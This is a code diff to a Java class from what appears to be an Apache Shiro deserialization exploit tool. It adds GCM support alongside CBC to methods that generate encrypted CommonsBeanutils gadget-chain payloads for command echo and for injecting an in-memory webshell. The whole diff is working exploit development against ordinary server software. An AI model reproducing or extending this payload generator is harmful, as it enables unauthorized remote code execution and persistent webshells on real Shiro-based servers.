@@ -77,6 +77,17 @@ public class CommonsBeanutilsAttrCompare {
      * @return 加密后的 payload 字符串
      */
     public static String genEchoPayload(String echoType, String key) throws Exception {
+        return genEchoPayload(echoType, key, "CBC");
+    }
+
+    /**
+     * 生成回显payload（支持指定加密模式）
+     * @param echoType 回显类型
+     * @param key Shiro Key
+     * @param cryptType 加密模式（"CBC" 或 "GCM"）
+     * @return 加密后的payload字符串
+     */
+    public static String genEchoPayload(String echoType, String key, String cryptType) throws Exception {
         ClassPool pool = ClassPool.getDefault();
         CtClass ctClass;
         CtClass superClass;
@@ -116,7 +127,7 @@ public class CommonsBeanutilsAttrCompare {
         // 生成反序列化 payload
         byte[] payload = new CommonsBeanutilsAttrCompare().getPayload(templatesImpl);
         String data = Base64.getEncoder().encodeToString(payload);
-        return Tools.CBC_Encrypt(key, data);
+        return Tools.encryptByType(key, data, cryptType);
     }
 
     /**
@@ -125,6 +136,16 @@ public class CommonsBeanutilsAttrCompare {
      * @return 加密后的 payload 字符串
      */
     public static String genMemPayload(String key) throws Exception {
+        return genMemPayload(key, "CBC");
+    }
+
+    /**
+     * 生成内存马payload（支持指定加密模式）
+     * @param key Shiro Key
+     * @param cryptType 加密模式（"CBC" 或 "GCM"）
+     * @return 加密后的payload字符串
+     */
+    public static String genMemPayload(String key, String cryptType) throws Exception {
         ClassPool pool = ClassPool.getDefault();
         CtClass ctClass;
         CtClass superClass;
@@ -150,6 +171,6 @@ public class CommonsBeanutilsAttrCompare {
         // 生成反序列化 payload
         byte[] payload = new CommonsBeanutilsAttrCompare().getPayload(templatesImpl);
         String data = Base64.getEncoder().encodeToString(payload);
-        return Tools.CBC_Encrypt(key, data);
+        return Tools.encryptByType(key, data, cryptType);
     }
 }
